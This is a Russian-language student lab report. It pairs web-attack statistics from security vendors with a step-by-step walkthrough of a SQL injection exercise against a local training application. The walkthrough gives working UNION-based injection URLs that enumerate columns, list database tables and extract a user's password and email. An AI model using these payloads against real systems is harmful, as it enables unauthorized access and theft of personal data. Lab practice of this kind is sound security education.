# Часть 1
## 1. Источники

1. https://bi.zone

2. https://d-russia.ru/solar-chislo-atak-c-podborom-parolej-v-nachale-2025-goda-vyroslo-pochti-v-3-raza.html

3. https://www.comnews.ru/content/233343/2024-05-24/2024-w21/1010/nngu-stal-uchastnikom-specialnoy-programmy-dlya-vuzov-kaspersky-academy-alliance

4. https://sm-security.ru/positive-technologies?etext=2202.b-A5B0gY5NtvzXSSSUiBYpFzkuIvBychu6T-GOhU27BZwemWBkGsw1dkNHN36Em4a2Vtenpuanl2aGhpY2lqYQ.04196d5e111180273202bc1170ac31910065dada&yclid=8011026150982680575

5. https://www.vikingcloud.com/blog/cybersecurity-statistics#:~:text=Device%20and%20Cloud%20Security%20Threats,one%20cloud%20attack%20a%20year.&text=78.,incidents%20result%20in%20data%20breaches.&text=79.,them%20alone%20caused%20by%20misconfigurations.&text=80.,part%20due%20to%20human%20error.&text=81.,are%20still%20vulnerable%20to%20attack.&text=82.,one%20known%20but%20unaddressed%20risk.&text=83.,%25%20year-on-year.&text=84.,are%20growing%20by%2020%25%20annually

## 2. Доля успешных атак через эксплуатацию веб-уязвимостей

Многие сайты выделяют долю эксплуатации уязвимостей в целом.
Я постаралась выделить долю веб-атак.

### 2.1 Данные из российских источников

*   **Positive Technologies**: В период со второго полугодия 2024 года по третий квартал 2025 года на организации в СНГ (включая Россию) пришлось 14–18% всех успешных кибератак в мире.
*   **ГК «Солар»**: Рост атак значителен: в 2024 году WAF-сервис компании зафиксировал **1,8 млрд** событий ИБ, что в 2,4 раза больше, чем в 2023 году. По данным компании, эксплуатация уязвимостей является одним из основных путей проникновения в инфраструктуру наряду с фишингом.


### 2.2 Данные из международных источников

*   **Fastly**: Согласно отчёту за первый квартал 2025 года, XSS и SQL-инъекции остаются одними из самых распространённых методов атак. XSS составляет **40%** от всего трафика атак, что на 5% больше по сравнению с аналогичным периодом прошлого года.


### 3. Распределение по категориям веб-уязвимостей, приводящих к успешным атакам

### 3.1 Recorded Future (H1 2025)

Среди реально эксплуатируемых уязвимостей:

| Категория (включая веб-контекст) | Доля |
|-----------------------------------|------|
| Remote Code Execution (включая web RCE) | ~33% |
| Authentication Bypass (в т.ч. веб) | ~18–22% |
| Improper Authorization / Access Control | ~15–18% |
| Injection (SQL инъекции, Command Injection) | ~10–12% |
| Deserialization (часто в веб-API) | ~5–8% |
| Прочие | ~10% |

### 3.2 Веб-атаки отдельно (SQL инъекции)

- SQL инъекции составляют ~65% веб-атак.

Вывод

1. Около 20–23% успешных атак происходят через эксплуатацию уязвимостей.
2. Значительная часть этих атак связана с веб-сервисами.
3. Среди веб-уязвимостей, приводящих к успешным атакам, доминируют:
   - Remote Code Execution
   - Authentication Bypass
   - Broken Access Control
   - Injection (включая SQL инъекции)


## Часть II. Практика SQL-инъекции

Задания:
1. Узнать пароль пользователя с ником Volk2.
2. Узнать почту пользователя с ником Vinni-pukh.

### Шаг 1. Тестирование точки входа
Проверка реакции сервера на спецсимволы в параметре id.

URL: http://localhost:8080/task/?id=1'
Результат: Ошибка синтаксиса MySQL. Это подтверждает наличие уязвимости типа Error-based SQL Injection.

### Шаг 2. Определение количествa колонок
Использование оператора ORDER BY для поиска количества полей в SELECT.

1. http://localhost:8080/task/?id=1' ORDER BY 3-- - (Успешно)
2. http://localhost:8080/task/?id=1' ORDER BY 4-- - (Ошибка: Unknown column '4' in 'order clause')

Вывод: В запросе участвуют 3 колонки.

### Шаг 3. Поиск ID целевых пользователей
Через UNION SELECT были определены идентификаторы целевых аккаунтов:


http://localhost:8080/task/?id=-1' UNION SELECT 1, id, 3 FROM users WHERE username='Volk2'-- -

http://localhost:8080/task/?id=-1' UNION SELECT 1, id, 3 FROM users WHERE username='Vinni-pukh'-- -

Volk2: логин = 9
Vinni-pukh: логин = 4

### Шаг 4. Выполнение Задания №1 (Пароль Volk2)
Использование UNION SELECT. Экспериментально установлено, что данные выводятся во вторую колонку (логин).

Запрос (URL):
    
    http://localhost:8080/task/?id=-1' UNION SELECT 1, password, 3 FROM users WHERE id=9-- -
Результат:
    > Ваш id: 1
    > Ваш логин: Wa spoiuuuuu

Ответ: Пароль Volk2 — Wa spoiuuuuu

### Шаг 5. Исследование структуры
В таблице users поле с адресом электронной почты отсутствует. Проверка списка всех таблиц текущей базы данных:

Запрос (URL):
    
    http://localhost:8080/task/?id=-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()-- -
Результат: emails, users.

Проверка названий колонок в найденной таблице emails:
Запрос (URL):
    
    http://localhost:8080/task/?id=-1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='emails'-- -
Результат: id, email_id.

### Шаг 6. Выполнение Задания №2 (Почта Vinni-pukh)
Извлечение данных из колонки email_id для id=4 из таблицы emails.

Запрос (URL):
    
    http://localhost:8080/task/?id=-1' UNION SELECT 1, email_id, 3 FROM emails WHERE id=4-- -
Результат:
    > Ваш id: 1
    > Ваш логин: honey_lover@otus-lab.com

Ответ: Email Vinni-pukh — **honey_lover@otus-lab.com**.


## Вывод
В ходе рaботы я изучила статистику актуальных угроз, подтвердившaя высокую опaсность веб-уязвимостей. Продемонстрирована эксплуатация SQL-инъекций, позволившaя полностью скомпрометировать конфиденциальные дaнные пользователей (пароли и email) из-за отсутствия фильтрации входных парaметров на стороне серверa.
